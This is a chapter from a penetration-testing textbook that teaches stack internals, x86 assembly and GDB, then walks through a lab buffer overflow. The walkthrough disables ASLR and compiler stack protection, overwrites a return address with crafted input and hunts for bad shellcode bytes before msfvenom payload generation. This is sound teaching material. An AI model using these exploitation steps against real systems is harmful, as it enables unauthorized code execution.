<html><head></head><body>
<div id="sbo-rt-content"><div id="_idContainer227">
<h1 id="_idParaDest-188"><em class="italic"><a id="_idTextAnchor187"/>Chapter 10</em>: Shellcoding - The Stack</h1>
<p>Up to this point, we’ve been working from a fairly high level of abstraction. We’ve reviewed some great tools for getting work done efficiently and learned how to easily generate reports in easy-to-digest formats. Despite this, there is a wall that will halt our progress if we stay above the murky lower layers, and constantly allow tools to hide the underlying machine. Regardless of the task we’re doing, packets and application data eventually work their way down to raw machine data. We learned this earlier while working with networking protocols, such as when a tool tells you that a destination is unreachable. While that may be true, it’s pretty meaningless when you want to know what happened to those bits of information that went flying down the wire. As a security professional, you need to be able to interpret the information at hand, and vague and incomplete data is a daily reality of this field. So, in this chapter, we’re going to start our journey into the lower mechanisms of the machine. This will lay a foundation for the hands-on exercises later in the book, where a solid understanding of how computers think is essential for programming tasks. Although this is a hands-on book, this chapter jumps into a little more theory than usual. Don’t worry, though, as we will also demonstrate how to use this understanding to inform real-world tasks.</p>
<p>In this chapter, we will do the following:</p>
<ul>
<li>Introduce the stack and debugging</li>
<li>Introduce assembly language</li>
<li>Build and work with a vulnerable C program</li>
<li>Examine memory with the GDB debugger</li>
<li>Introduce the concept of endianness</li>
<li>Introduce shellcoding concepts</li>
<li>Learn how to fine-tune our shellcode with <strong class="source-inline">msfvenom</strong></li>
</ul>
<h1 id="_idParaDest-189"><a id="_idTextAnchor188"/>Technical requirements</h1>
<p>The technical requirements for this chapter are as follows:</p>
<ul>
<li>Kali Linux</li>
<li>An older version of Kali or BackTrack, or a different flavor of Linux that allows stack execution</li>
</ul>
<h1 id="_idParaDest-190"><a id="_idTextAnchor189"/>An introduction to debugging</h1>
<p>This isn’t a book about reverse engineering as such, but the science and art of reversing serves us well as pen testers. Even if we don’t write our own exploits, reversing gives us the bird’s eye view we need to understand low-level memory management. We’ve looked at a couple of languages so far – Python and Ruby – and we’ll also be taking a look at some very basic C code in this chapter. These languages are high-level languages. This means they are layers of logical abstraction away from the native language of the machine and closer to how people think. Therefore, they consist of high-level concepts such as objects, procedures, control flows, variables, and so on. This hierarchy of abstraction in high-level languages is by no means flat – C, for example, is considered to be closer to the machine’s native language compared to other high-level languages. Low-level languages, on the other hand, have little to no abstraction from machine code. The most important low-level language for a hacker is an assembly language, which usually has just one layer of abstraction from pure machine code. Assembly languages consist of mnemonic representations for opcodes (a number that represents a particular action <a id="_idIndexMarker743"/>taken by the processor) and temporary storage boxes, called registers, for the operands being moved around. At the lowest level, all programs are basically fancy memory management – they’re all made up of data and data has to be stored and read from somewhere.</p>
<p>From here on out, unless <a id="_idIndexMarker744"/>specifically stated otherwise, we’re working with <strong class="bold">Intel Architecture-32</strong> (<strong class="bold">IA-32</strong>), which is the 32-bit x86 instruction set architecture (the original x86 was 16-bit). It’s the most common architecture and thus closest to real-world applicability. It’s also a great start for understanding other architectures. For now, let’s take a look at how memory is allocated at runtime.</p>
<h2 id="_idParaDest-191"><a id="_idTextAnchor190"/>Understanding the stack</h2>
<p>The stack is a block of memory that is associated with a particular process or thread. When we say stack, just think of a stack of dishes. At first, you have a table or kitchen counter; then, you <a id="_idIndexMarker745"/>place a plate on the surface. Then, you place the next plate on top of the previous plate. To get to a plate in the middle of the stack, you need to remove the plates above it first. (Okay, maybe I’m getting a little carried away with this analogy. I used to wait tables.)</p>
<p>This method of organizing the stack is called a <strong class="bold">Last in, First out</strong> (<strong class="bold">LIFO</strong>) structure. Getting data on the <a id="_idIndexMarker746"/>stack is called a <strong class="bold">push</strong> operation. Getting data <a id="_idIndexMarker747"/>off the stack is known as a <strong class="bold">pop</strong> operation, which also <a id="_idIndexMarker748"/>happens to be one of <a id="_idIndexMarker749"/>my favorite terms in computer science. Sometimes you’ll see <strong class="bold">pull</strong> operation, but let’s be honest, pop sounds much more fun. During the execution of a program, when a function is called, the function and its data are pushed onto the stack. The stack pointer keeps an eye on the top of the stack as data is pushed and popped off the stack. After all the data in the procedure has been popped off of the stack, the final piece of information is a <strong class="source-inline">return</strong> instruction that takes us back to the point in the program right before the call began. Since the program data is in the memory, <strong class="source-inline">return</strong> is an instruction to jump to a particular memory address.</p>
<h2 id="_idParaDest-192"><a id="_idTextAnchor191"/>Understanding registers</h2>
<p>Before we start playing around with debuggers, we need to review registers and some basic assembly language <a id="_idIndexMarker750"/>concepts. As stated earlier, processors deal with data, and data needs to be stored somewhere, even if it’s only for a tiny fraction of a second. Registers are little storage areas (and by little we mean 8 bits, 16 bits, 32 bits, and 64 bits) that are directly accessible by the processor as they’re built into the processor itself. </p>
<p>When you’re working at your desk in your office, the things that are within an arm’s reach are the items that can be accessed immediately. Let’s suppose you need something from the filing cabinet in your office. This might take you a few extra minutes, but the object is still readily available. Now, imagine you have boxes of paper up in the attic. It’ll be a bit of a pain to have to retrieve data from up there, but you can pull out the ladder when you have to. Having to retrieve program data from secondary storage (the hard drive) takes a lot of time for the processor and is similar to your dusty old attic. The RAM can be thought of as that filing cabinet that has more room than your desk, but getting something from it is not as quick as grabbing something from your desk. Your processor needs registers like you need some space on your desk.</p>
<p>Although the IA-32 architecture has a handful of registers for various purposes, there are only eight that you’ll <a id="_idIndexMarker751"/>be concerned with: the general-purpose registers. Remember when we mentioned that the original x86 was 16-bit? Well, the 32-bit is an extension (hence the <em class="italic">E</em>) of the 16-bit architecture, which means all of the original registers are still there and occupy the lower half of the register. The 16-bit architecture itself is an extension of the 8-bit granddaddy of the distant past (the 8080), so you’ll also find the 8-bit registers occupying the high and low ends of the A, B, C, and D 16-bit registers. This design allows for backward compatibility. Take a look at the following diagram:</p>
<div>
<div class="IMG---Figure" id="_idContainer214">
<img alt="Figure 10.1 – IA-32 registers map " height="512" src="image/Figure_10.1_B17616.jpg" width="491"/>
</div>
</div>
<p class="figure-caption">Figure 10.1 – IA-32 registers map</p>
<p>Technically, all of the previously-mentioned registers (aside from <strong class="source-inline">ESP</strong>) can be used as generic registers, but most of the time, <strong class="source-inline">EAX</strong>, <strong class="source-inline">EBX</strong>, and <strong class="source-inline">EDX</strong> are the true generics. <strong class="source-inline">ECX</strong> can be used as a counter (think <em class="italic">C</em> for <em class="italic">counter</em>) in functions that require one. <strong class="source-inline">ESI</strong> and <strong class="source-inline">EDI</strong> are often used as the <strong class="bold">source index</strong> (<strong class="bold">SI</strong>) and the <strong class="bold">destination index</strong> (<strong class="bold">DI</strong>) when memory is being <a id="_idIndexMarker752"/>copied from one location to another. <strong class="source-inline">EBP</strong> is usually used as the <a id="_idIndexMarker753"/>stack base pointer. <strong class="source-inline">ESP</strong> is always the stack pointer – the location of the current place in the stack (the top). Accordingly, if data is to be pushed to (or popped from) the stack, <strong class="source-inline">ESP</strong> tells us where it is going to or coming from. For example, if the data is getting pushed to or popped from right under the position of the stack pointer, the stack pointer then updates to the new top position. So, what distinguishes the stack pointer from the stack base pointer? The stack base is the bottom of the current stack frame. When we discussed the example of a function call earlier, we saw that the stack frame is all of the associated data pushed onto the stack. The return at the bottom of the stack frame is located right under the base pointer. As you can see, these references help us to truly understand what’s happening in memory. Speaking of pointers, we should be aware of the <strong class="source-inline">EIP</strong> instruction register (instruction pointer), which tells the processor where the next instruction is located. It isn’t a general-purpose register, as you can imagine.</p>
<p>Finally, there’s the status register <strong class="source-inline">EFLAGS</strong> (once again, the <em class="italic">E</em> stands for extended, as in the 16-bit ancestor, it is called <strong class="source-inline">FLAGS</strong>). Flags are special bits that contain processor state information. For <a id="_idIndexMarker754"/>example, when the processor is asked to perform subtraction, and the answer is zero, the zero flag is set. Similarly, if the result is negative, the sign flag is set. There are also control flags, which will actually influence how a processor performs a particular task.</p>
<h2 id="_idParaDest-193"><a id="_idTextAnchor192"/>Assembly language basics</h2>
<p>If you think all of this juicy information about registers is fascinating, then just wait until you learn about assembly language where the whole life story of registers is written! We’re only looking at the <a id="_idIndexMarker755"/>basics here, as a proper treatment of the topic would require a lot more pages. Regardless, there are some fundamentals that will help you to understand the whole subject of assembly language for those who are brave enough to dive into the topic beyond this book.</p>
<p>Assembly, with all of its brutality, is also beautiful in its simplicity. It’s hard to imagine anything so close to machine code as being simple, but remember that what a processor does is pretty simple – it does math, it moves data around, and stores small amounts of data, including state information. It’s also important to remember that the processor understands binary – just 0’s and 1’s at its lowest level. There are two ways we make this binary machine language slightly more human-friendly – using the compact representation of binary (that is, using number bases that are powers of two; hexadecimal is what we’ll be using the most), and assembly language, which uses mnemonics to represent operations. There are two primary components of almost all assembly language – opcodes and operands. An <strong class="bold">opcode</strong>, short for <strong class="bold">operation code</strong>, is a code that represents <a id="_idIndexMarker756"/>a particular instruction. An operand is a parameter that is used by the opcode and can be the immediate operand type, which is a value defined in the code; a register reference; or a memory address reference (which can actually be either of the first two data types). Note that the occasional opcode has no operands. If there’s a destination and a source operand, the destination goes first, as you can see in the following example:</p>
<p class="source-code">mov    edi,ecx</p>
<p>In this case, the <strong class="source-inline">edi</strong> register is the destination and the <strong class="source-inline">ecx</strong> register is the source. </p>
<p>Keep in mind that there are two assembly language notations in use depending on the environment – Intel and AT&amp;T. You’ll encounter the Intel notation when working with Windows binaries, so we’ll <a id="_idIndexMarker757"/>be defaulting to that notation in this book. However, you will encounter the AT&amp;T notation in Unix environments. One major difference between Intel and AT&amp;T is that the destination and source operands are in the opposite order in AT&amp;T notation; however, memory addresses are referenced with <strong class="source-inline">%()</strong>, which makes it easy to tell which notation is in front of you. </p>
<p>Let’s get started by <a id="_idIndexMarker758"/>looking at basic opcodes and some examples:</p>
<ul>
<li><strong class="source-inline">mov</strong> means move and will be the most common opcode you’ll see, as the bulk of a processor’s work is moving things to and from convenient spots (such as registers) so that it can work on the task at hand. An example of <strong class="source-inline">mov</strong> is as follows:</li>
</ul>
<p class="source-code">mov    ecx,0xbff4ca0b</p>
<ul>
<li><strong class="source-inline">add</strong>, <strong class="source-inline">sub</strong>, <strong class="source-inline">div</strong>, and <strong class="source-inline">mul</strong> are all basic arithmetic opcodes – addition, subtract, division, and multiplication, respectively.</li>
<li><strong class="source-inline">cmp</strong> is the comparer, which takes two operands and sets the status of the result with flags. In the following example, two values are compared; they’re clearly the same, so the difference between them is <strong class="source-inline">0</strong> and thus the zero flag is set:</li>
</ul>
<p class="source-code">cmp    0x3e2,0x3e2</p>
<ul>
<li><strong class="source-inline">call</strong> is the function caller. This operation causes the instruction pointer to be pushed onto the stack so that the current location can be recalled, and execution then jumps to the specified address. An example of <strong class="source-inline">call</strong> is as follows:</li>
</ul>
<p class="source-code">call    0xc045bbb2</p>
<ul>
<li><strong class="source-inline">jcc</strong> conditional instructions are the if/then of the assembly world. <strong class="source-inline">jnz</strong> is pretty common and takes one operand – a destination address in memory. It means jump if not zero, so you’ll often see it after a <strong class="source-inline">cmp</strong> operation. In the following example, the value stored in <strong class="source-inline">eax</strong> is compared with the hexadecimal value <strong class="source-inline">3e2</strong> (<strong class="source-inline">994</strong> in decimal), and if the zero flag is not set, execution jumps to the location <strong class="source-inline">0xbbbf03a5</strong> in memory. The following two lines, in plain English are: <em class="italic">check whether whatever is in the</em> <strong class="source-inline">eax</strong> <em class="italic">register is equal to</em> <strong class="source-inline">994</strong> <em class="italic">or not. If they are different numbers, then jump to the instruction at</em> <strong class="source-inline">0xbbbf03a5</strong>:</li>
</ul>
<p class="source-code">cmp    eax,0x3e2</p>
<p class="source-code">jnz    0xbbbf03a5</p>
<ul>
<li><strong class="source-inline">push</strong> is the same push from our discussion about how the stack works. This command pushes <a id="_idIndexMarker759"/>something onto the stack. If you have a series of <strong class="source-inline">push</strong> operations, then those operands end up in the stack in the LIFO structure in the order in which they appear, as shown in the following example:</li>
</ul>
<p class="source-code">push    edx</p>
<p class="source-code">push    ecx</p>
<p class="source-code">push    eax</p>
<p class="source-code">push    0x6cc3</p>
<p class="source-code">call    0xbbfffc32</p>
<p>As you can see, this is a <a id="_idIndexMarker760"/>very simple introduction. Assembly is one of those things that is better learned through examples, so stay tuned for more analysis later on in the book.</p>
<h2 id="_idParaDest-194"><a id="_idTextAnchor193"/>Disassemblers, debuggers, and decompilers – oh my!</h2>
<p>It’s always wise to <a id="_idIndexMarker761"/>review the differences between these terms before going any <a id="_idIndexMarker762"/>further because <a id="_idIndexMarker763"/>believe it or not, these words are commonly used interchangeably:</p>
<div>
<div class="IMG---Figure" id="_idContainer215">
<img alt="Figure 10.2 – Disassembler versus decompiler " height="253" src="image/Figure_10.2_B17616.jpg" width="1134"/>
</div>
</div>
<p class="figure-caption">Figure 10.2 – Disassembler versus decompiler</p>
<p>Let’s define each term:</p>
<ul>
<li>A <strong class="bold">debugger</strong> is a tool for testing program execution. It can help an engineer identify where <a id="_idIndexMarker764"/>execution is breaking. A debugger will use some sort of disassembler. </li>
<li>A <strong class="bold">disassembler</strong> is a program <a id="_idIndexMarker765"/>that takes pure machine code as input and <a id="_idIndexMarker766"/>displays the assembly language representation of the underlying code.</li>
<li>A <strong class="bold">decompiler</strong> attempts to reverse the compilation process. In other words, it attempts to reconstruct a <a id="_idIndexMarker767"/>binary in a high-level language, such as C. Lots of <a id="_idIndexMarker768"/>constructs in the programmer’s original code are often lost, so decompilation is not an exact science.</li>
</ul>
<p>As you work with debuggers throughout this book, you will see the assembly language representation of a given executable file, so disassembly is a necessary part of this process. An engineer who just needs to understand what’s happening at the processor level only needs a disassembler, whereas an engineer trying to recover high-level functionality from a program will need a decompiler.</p>
<p>Now, let’s start playing around with one of the best debuggers (in our opinion) – <strong class="bold">GNU debugger</strong> (<strong class="bold">GDB</strong>).</p>
<h2 id="_idParaDest-195"><a id="_idTextAnchor194"/>Getting cozy with the Linux command-line debugger – GDB</h2>
<p>You can find GDB in the <a id="_idIndexMarker769"/>repository, so installing it is easy. Just grab it with <strong class="source-inline">apt-get install gdb</strong>. Once installed, just use the following command to get started:</p>
<p class="source-code"># gdb</p>
<p>There are a lot of commands available in GDB categorized by class, so it’s recommended that you review the GDB documentation offline to get a better idea of its power. We’ll be looking at other debuggers later on, so we won’t spend a lot of time here. Let’s look at the basics:</p>
<ul>
<li>You can load an executable by simply passing the name and location of the file as an argument when running <strong class="source-inline">gdb</strong> from the command line. You can also attach GDB to an existing process with <strong class="source-inline">--pid</strong>.</li>
<li>The <strong class="source-inline">info</strong> command is a powerful window into what’s going on behind the scenes; <strong class="source-inline">info breakpoints</strong> will list and provide information about breakpoints and specific locations in the code where execution stops so you can examine it and its environment. <strong class="source-inline">info registers</strong> is important during any stack analysis as it shows us what’s going on with the processor’s registers at a given moment. Use it with <strong class="source-inline">break</strong> to monitor changes to register values as the program runs.</li>
<li><strong class="source-inline">list</strong> will show us the source code if it’s included. We can then set breakpoints based on positions in the source code, which is extremely handy.</li>
<li><strong class="source-inline">run</strong> tells GDB to run the target; you pass arguments to <strong class="source-inline">run</strong> as you would to the target outside of GDB.</li>
<li><strong class="source-inline">x</strong> simply means to examine and lets us peek inside memory. We’ll use it to examine a set number of addresses beyond the stack pointer. For example, to examine <strong class="source-inline">45</strong> hexadecimal words past the stack pointer ESP, we would issue <strong class="source-inline">x/45x $esp</strong>.</li>
</ul>
<p>Now we’re going to take this introduction to the next stage and start playing with a vulnerable program in GDB.</p>
<h1 id="_idParaDest-196"><a id="_idTextAnchor195"/>Stack smack – introducing buffer overflows</h1>
<p>Earlier in the chapter, we learned about the magical world of the stack. The stack is very orderly, and its core <a id="_idIndexMarker770"/>design assumes all players are following its rules – for example, that anything copying data to the buffer has been checked to make sure it will actually fit.</p>
<p>Although you can use your latest Kali Linux to set this up and study the stack and registers, stack execution countermeasures are built into the latest releases of Kali. We recommend using a different flavor of Linux (or an older version of Kali or BackTrack) to see the exploit in action. Regardless, we’ll be attacking Windows boxes in<em class="italic"> </em><a href="B17616_12_Final_VK_ePub.xhtml#_idTextAnchor224"><em class="italic">Chapter 12</em></a>, <em class="italic">Shellcoding - Evading Antivirus</em>.</p>
<p>Before we start, we need to disable the stack protections built into Linux. Part of what makes stack overflows possible is being able to predict and manipulate memory addresses. However, <strong class="bold">Address Space Layout Randomization</strong> (<strong class="bold">ASLR</strong>) makes this harder, as it’s <a id="_idIndexMarker771"/>tough to predict something that’s being randomized. We’ll discuss bypass methods later, but for the purposes of our demonstration, we’re going to temporarily disable it with the following command:</p>
<p class="source-code"># echo 0 &gt; /proc/sys/kernel/randomize_va_space</p>
<p class="callout-heading">Walk before You Run: Disabling Protections</p>
<p class="callout">It’s important to understand the fundamentals of stack overflows, so we’re using this chapter and the next to create an ideal attack lab that is educational but unlikely to represent your actual clients’ environments. The industry has learned from what we’re discussing here, and today you’re going to run into protections such as ASLR and DEP. Stay tuned for <a href="B17616_11_Final_VK_ePub.xhtml#_idTextAnchor205"><em class="italic">Chapter 11</em></a>, <em class="italic">Shellcoding - Bypassing Protections</em>, to get an up-to-date feel for how these attacks work. By then, you’ll have a historical perspective and the conceptual understanding to inform your studies outside of this book. </p>
<p>Now, let’s use our trusty nano to type up a quick (and vulnerable) C program, as follows:</p>
<p class="source-code"># nano demo.c</p>
<p>As we type this out, let’s take a look at our vulnerable code:</p>
<div>
<div class="IMG---Figure" id="_idContainer216">
<img alt="Figure 10.3 – Editing our program in nano " height="270" src="image/Figure_10.3_B17616.jpg" width="1370"/>
</div>
</div>
<p class="figure-caption">Figure 10.3 – Editing our program in nano</p>
<p>The program starts with the preprocessing directive, <strong class="source-inline">#include</strong>, which tells the program to include the defined header file. Here, <strong class="source-inline">stdio.h</strong> is the header file that defines variable types for standard input and output. The program sets up the <strong class="source-inline">main</strong> function, which returns <a id="_idIndexMarker772"/>nothing (hence <strong class="source-inline">void</strong>); the <strong class="source-inline">buffer</strong> variable is declared and set at <strong class="source-inline">300</strong> bytes in size; the <strong class="source-inline">strcpy</strong> (string copy) command copies the argument passed to the program into the <strong class="source-inline">300</strong> byte buffer; a message from a classic movie on robotics is displayed; and the function ends.</p>
<p>Now, we’ll compile our program. Note that we’re also disabling stack protections during compilation in the following example:</p>
<p class="source-code"># gcc -g -fno-stack-protector -z execstack -o demo demo.c</p>
<p class="source-code"># ./demo test</p>
<p>When you run the program, you should see the output from <strong class="source-inline">printf</strong> as expected:</p>
<div>
<div class="IMG---Figure" id="_idContainer217">
<img alt="Figure 10.4 – Running our demo program " height="267" src="image/Figure_10.4_B17616.jpg" width="1059"/>
</div>
</div>
<p class="figure-caption">Figure 10.4 – Running our demo program</p>
<p>We can now see that the demo program took <strong class="source-inline">test</strong> as input and copied it to the buffer. The <strong class="source-inline">printf</strong> function then displays our message. The input is small, so we shouldn’t expect any issues; it fits in the buffer with room to spare. Let’s take a look at what happens if we hold down the <em class="italic">z</em> key for a while before submitting the input:</p>
<div>
<div class="IMG---Figure" id="_idContainer218">
<img alt="Figure 10.5 – Demo program crash " height="353" src="image/Figure_10.5_B17616.jpg" width="1197"/>
</div>
</div>
<p class="figure-caption">Figure 10.5 – Demo program crash</p>
<p>Ah-ha! There’s a <em class="italic">segmentation fault</em>. The program has been broken because we put in too much data. The program is simple and quite literally does nothing, but still has a <strong class="source-inline">main</strong> function. At some <a id="_idIndexMarker773"/>point, this function is called where a buffer is set aside for it. Once everything is popped back off the stack, we’ll be left with a return pointer. If this points to somewhere invalid, the program crashes. Now let’s load our program into GDB and see what’s going on behind the curtain.</p>
<h2 id="_idParaDest-197"><a id="_idTextAnchor196"/>Examining the stack and registers during execution</h2>
<p>We’ll issue <a id="_idIndexMarker774"/>the <strong class="source-inline">run</strong> command with our initial <strong class="source-inline">test</strong> input and <a id="_idIndexMarker775"/>then examine the registers to see what the normal operation looks like, as follows:</p>
<p class="source-code"># gdb demo</p>
<p class="source-code">(gdb) break 6</p>
<p class="source-code">(gdb) run test</p>
<p class="source-code">(gdb) info registers</p>
<p>This will give us a nice map of the registers:</p>
<div>
<div class="IMG---Figure" id="_idContainer219">
<img alt="Figure 10.6 – Register map in GDB " height="639" src="image/Figure_10.6_B17616.jpg" width="1320"/>
</div>
</div>
<p class="figure-caption">Figure 10.6 – Register map in GDB</p>
<p>As we can see in the preceding screenshot, <strong class="source-inline">esp</strong> and <strong class="source-inline">ebp</strong> are right next to each other, and so, now we can <a id="_idIndexMarker776"/>figure out the stack frame. Working <a id="_idIndexMarker777"/>from <strong class="source-inline">esp</strong>, let’s find the return address. Remember, it’ll be the first hexadecimal word after the base pointer. We know that we start at <strong class="source-inline">esp</strong>, but how far do we look in memory? Let’s review the math.</p>
<p>The stack pointer is at <strong class="source-inline">0xbffff470</strong>, and the base pointer is at <strong class="source-inline">0xbfff5a8</strong>. This means we can eliminate <strong class="source-inline">bfff</strong>, so we’re counting hexadecimal words from <strong class="source-inline">470</strong> to <strong class="source-inline">5a8</strong>. An easy way to think of this is by counting groups of 16: <strong class="source-inline">220</strong>, <strong class="source-inline">230</strong>, <strong class="source-inline">240</strong>, <strong class="source-inline">250</strong>, and so on, up to <strong class="source-inline">360</strong>, which is 20 groups. Therefore, we’ll examine 80 hexadecimal words. If you thought that was 14 groups rather than 20, you’re probably stuck in base-10 mode. Remember we’re in base-16, meaning <strong class="source-inline">220</strong>, <strong class="source-inline">230</strong>, <strong class="source-inline">240</strong>, <strong class="source-inline">250</strong>, <strong class="source-inline">260</strong>, <strong class="source-inline">270</strong>, <strong class="source-inline">280</strong>, <strong class="source-inline">290</strong>, <strong class="source-inline">2a0</strong>, <strong class="source-inline">2b0</strong>, <strong class="source-inline">2c0</strong>, and so on.</p>
<p>Now we know we’re examining 80 hexadecimal words, let’s pass this command to GDB:</p>
<p class="source-code">(gdb) x/80x $esp</p>
<p>If you find the base pointer address and then identify the hexadecimal word right after it, you will get the return address, as shown in the following screenshot:</p>
<div>
<div class="IMG---Figure" id="_idContainer220">
<img alt="Figure 10.7 – The return address highlighted " height="605" src="image/Figure_10.7_B17616.jpg" width="1014"/>
</div>
</div>
<p class="figure-caption">Figure 10.7 – The return address highlighted</p>
<p>Examine this <a id="_idIndexMarker778"/>until it makes sense. Then, use <strong class="source-inline">quit</strong> to exit so we <a id="_idIndexMarker779"/>can do the same procedure over again. This time, we will crash our program with a long string of the letter <strong class="source-inline">z</strong>, as shown in the following command:</p>
<p class="source-code"># gdb demo</p>
<p class="source-code">(gdb) break 6</p>
<p class="source-code">(gdb) run $(python -c 'print "z"*400')</p>
<p>Ahh! What have we done? Take a look at the memory address the function is trying to jump to, shown in the following screenshot:</p>
<div>
<div class="IMG---Figure" id="_idContainer221">
<img alt="Figure 10.8 – Taking a look at where the program tried to send execution " height="666" src="image/Figure_10.8_B17616.jpg" width="1320"/>
</div>
</div>
<p class="figure-caption">Figure 10.8 – Taking a look at where the program tried to send execution</p>
<p>As you can see, if you run <strong class="source-inline">x/80x $esp</strong> as you did before, you’ll see the stack again. Find the base pointer, then <a id="_idIndexMarker780"/>read the hexadecimal <a id="_idIndexMarker781"/>word after it. It now says <strong class="source-inline">0x7a7a7a7a</strong>. <strong class="source-inline">7a</strong> is the hexadecimal representation of the ASCII <strong class="source-inline">z</strong>. We overflowed the buffer and replaced the return address! Our computer is very angry with us about this because <strong class="source-inline">0x7a7a7a7a</strong> either doesn’t exist or we have no business jumping there. Before we move on to turn this into a working attack, we need to make sure we understand the order of bits in memory.</p>
<h2 id="_idParaDest-198"><a id="_idTextAnchor197"/>Lilliputian concerns – understanding endianness </h2>
<p class="author-quote">“It is computed that eleven thousand persons have at several times suffered death, rather than submit to break their eggs at the smaller end.”</p>
<p><em class="italic">– Jonathan Swift, "Gulliver's Travels"</em></p>
<p>Take a break from the keyboard for a moment and enjoy a literary tidbit. In <em class="italic">Gulliver's Travels</em> by Jonathan <a id="_idIndexMarker782"/>Swift, published in 1726, our narrator and traveler Lemuel Gulliver talks of his adventure in the country of Lilliput. The Lilliputians are revealed to be a quirky bunch, known for deep conflict over seemingly trivial matters. For centuries, Lilliputians cracked open their eggs at the big end. When an emperor tried to enforce by law that eggs are to be cracked open at the little end, it resulted in rebellions, and many were killed.</p>
<p>In the world of computing, it turns out that not everyone agrees on how bytes should be ordered in memory. If you spent a lot of time with networking protocols, you’ll be used to what is intuitive for people who read from left to right – <em class="italic">big-endian</em>, meaning the most significant bits are <a id="_idIndexMarker783"/>in memory first. With <em class="italic">little-endian</em>, the least significant bits go first. In layman’s terms, little-endian looks backwards. This is important for us as hackers because, like the Lilliputians, not everyone agrees with you on things you may otherwise consider trivial. As a shellcoder, and a reverser in particular, you should immediately get comfortable with little-endian ordering as it is the standard of Intel processors.</p>
<p>Let’s give a quick example using a hexadecimal word from memory. For example, let’s say you want <strong class="source-inline">0x12345678</strong> to appear in the stack. The string you’d pass to the overflowing function is <strong class="source-inline">\x78\x56\x34\x12</strong>. When your exploits fail, you’ll find yourself checking byte order before anything else as a troubleshooting step.</p>
<p>Now, we’re going to get into the wacky world of shellcoding. We previously mentioned that stuffing 400 bytes of the ASCII letter <em class="italic">z</em> into the buffer caused the return address to be overwritten with <strong class="source-inline">0x7a7a7a7a</strong>. What return address will we jump to if we execute the program with the following input?</p>
<p class="source-code"># demo $(python -c 'print "\x7a"*300 + "\xef\xbe\xad\xde"')</p>
<p>Keep the little-endian concept in mind and try this out before moving on to the next section.</p>
<h1 id="_idParaDest-199"><a id="_idTextAnchor198"/>Introducing shellcoding</h1>
<p>If you played around with the last example in the previous section, you should have seen that execution tried to jump to <strong class="source-inline">0xdeadbeef</strong>. (We used <strong class="source-inline">deadbeef</strong> because it’s one of the few things <a id="_idIndexMarker784"/>you can say with hexadecimal characters. Besides, doesn’t it look like some sort of scary hacker moniker?) The point of this is to demonstrate that, by choosing the input carefully, you are able to control the return address. This means we can also pass shellcode as an argument and pad it to just the right size necessary to concatenate a return address to a payload, which will then return and result in its execution. This is essentially the heart of the stack overflow attack. However, as you can imagine, the return needs to point to a nice spot in memory. Before we tackle that, let’s get our hands on some bytes slightly more exciting than <strong class="source-inline">deadbeef</strong>.</p>
<p>Instead of generating the payload and passing it to some file that will be an input to <strong class="bold">Metasploit</strong> or <strong class="bold">Shellter</strong>, we actually want to get our hands on those naughty hexadecimal bytes. So, instead <a id="_idIndexMarker785"/>of outputting to an executable file, we’ll just output in a Python <a id="_idIndexMarker786"/>format and grab the values straight out of the terminal. You know where this is going, right? Yes, we’re going to use <strong class="source-inline">msfvenom</strong> to generate our payload. Go ahead and try it – use a Linux x86 payload, grab the bytes, and see if you can stuff the buffer and overwrite the return address. </p>
<p>It didn’t work, did it? You can see the first handful of your payload’s bytes, but then it seems to break into zeros and a <a id="_idIndexMarker787"/>few other memory references here and there. We mentioned <em class="italic">bad characters</em> when we first introduced <strong class="source-inline">msfvenom</strong> – hexadecimal bytes that will actually break execution for some reason. The infamous example is <strong class="source-inline">\x00</strong>, the null byte. If you tried using the example from the <strong class="source-inline">msfvenom</strong> help screen – <strong class="source-inline">'\x00\xff'</strong> – that’s a good guess, but it probably didn’t work either. So, our only option is to go hunting in the hexadecimal jungle to find the bytes that are breaking our shellcode.</p>
<p>How do we do that without going byte-by-byte in our shellcode? Thankfully, there’s a nifty workaround.</p>
<h2 id="_idParaDest-200"><a id="_idTextAnchor199"/>Hunting bytes that break shellcode</h2>
<p>What’s nice about our broken shellcode problem is that the culprits are just a byte each. A single byte is just <a id="_idIndexMarker788"/>two hexadecimal digits, so there can only be a total of <em class="italic">16 * 16 = 256</em> characters to review. This sounds like a lot to go through manually, but we already have our target executable demo, and we have GDB. So, why not pass all 256 characters (our hunting payload) as a single argument with a <em class="italic">target</em> sequence at the end and see if our pad makes it to the stack? If it doesn’t, we know the code broke somewhere and we can step through byte-by-byte to find the break. When it breaks, remove the offending character – then rinse and repeat.</p>
<p>Let’s take a look at our example. Note that I’m using 4 bytes of <strong class="source-inline">\x90</strong> as fluff:</p>
<div>
<div class="IMG---Figure" id="_idContainer222">
<img alt="Figure 10.9 – Using GDB to find breaks in the shellcode " height="182" src="image/Figure_10.9_B17616.jpg" width="1217"/>
</div>
</div>
<p class="figure-caption">Figure 10.9 – Using GDB to find breaks in the shellcode</p>
<p>Let’s examine this output more closely:</p>
<ul>
<li>We can easily see our 4 bytes of fluff in the next word in memory – <strong class="source-inline">0x90909090</strong>. Therefore, we expect the <em class="italic">next</em> word in memory to be the beginning of our hunting payload; the first four bytes are 01, 02, 03, and 04. This is little-endian, so we expect <strong class="source-inline">0x04030201</strong>.</li>
<li>We see the expected word at the next location in memory, so now let’s just hunt for a break. We know the following words should look like this – <strong class="source-inline">0x08070605</strong>, <strong class="source-inline">0x0c0b0a09</strong>, and so on.</li>
<li>Hark! Instead of the continuation of our hunting payload, we find <strong class="source-inline">0xb7fcc100</strong>. That looks a lot like a location in the memory. Regardless, we see that <strong class="source-inline">\x08</strong> was the last byte in our sequence that made it to the stack.</li>
<li>Thus, we can now infer that <strong class="source-inline">\x09</strong> broke the code.</li>
</ul>
<p>Now we take out the <a id="_idIndexMarker789"/>offending character and run through it again with the modified hunting payload – this is the <em class="italic">rinse and repeat</em> part. Eventually, if we get to the end and see our target sequence, we know that our characters are good. In this example, we’ve used <strong class="source-inline">\x7a</strong> as the target. Now let’s jump ahead to the moment when I finally pass a hunting payload that’s devoid of bad characters.</p>
<p>When I find that telltale 4 bytes of <strong class="source-inline">\x7a</strong>, I know we’ve made it to the end:</p>
<div>
<div class="IMG---Figure" id="_idContainer223">
<img alt="Figure 10.10 – Proof of concept: the shellcode contains no bad characters " height="1065" src="image/Figure_10.10_B17616.jpg" width="1217"/>
</div>
</div>
<p class="figure-caption">Figure 10.10 – Proof of concept: the shellcode contains no bad characters</p>
<p>You might be wondering if it’s possible to search for bad characters online. This will inform you of <a id="_idIndexMarker790"/>consistent offenders, such as <strong class="source-inline">\x00</strong>. However, this is something that can vary from system to system. Regardless, this is a valuable exercise because you are gaining experience and intimacy with the target. </p>
<h2 id="_idParaDest-201"><a id="_idTextAnchor200"/>Generating shellcode with msfvenom</h2>
